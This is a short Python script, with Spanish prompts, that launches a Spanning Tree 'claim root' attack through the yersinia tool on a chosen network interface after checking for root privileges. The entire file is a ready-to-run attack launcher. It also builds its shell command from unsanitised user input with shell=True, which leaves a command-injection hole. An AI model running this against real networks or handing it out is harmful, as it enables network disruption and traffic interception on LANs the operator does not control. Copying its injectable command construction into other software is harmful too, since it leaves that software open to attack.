#!/usr/bin/env python3
import os
import sys
import subprocess

if os.geteuid() != 0:
    print("Ejecuta con sudo")
    sys.exit(1)

interface = input("Ingrese la interfaz: ").strip() or "eth0"

print("Iniciando STP Claim Root Attack...")
try:
    subprocess.run(f"yersinia stp -attack 4 -interface {interface}", shell=True)
except KeyboardInterrupt:
    print("Ataque detenido.")